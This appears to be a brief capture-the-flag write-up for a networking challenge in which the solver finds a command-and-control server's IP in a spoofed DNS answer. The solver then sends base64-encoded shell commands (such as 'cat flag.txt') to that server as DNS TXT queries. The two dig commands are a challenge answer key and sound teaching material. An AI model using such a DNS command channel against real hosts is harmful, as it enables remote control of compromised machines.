# Do Not Stop
​
This networking problem involved emulating some C2 traffic from a PCAP. The solution flow was:

* Observe that DNS requests
* Observe that the real C2 server IP address is given as the A record response for `dns.google.com` using `35.225.16.21` as the name server.
* Knowing the real C2/infected server address, execute base64-encoded commands on it to get the flag.

These steps can be summarized with the following two commands:

```sh
dig -t a dns.google.com @35.225.16.21

# 3.88.57.227 is result of previous command.
dig -t txt $(base64 <<< 'cat flag.txt') @3.88.57.227
```
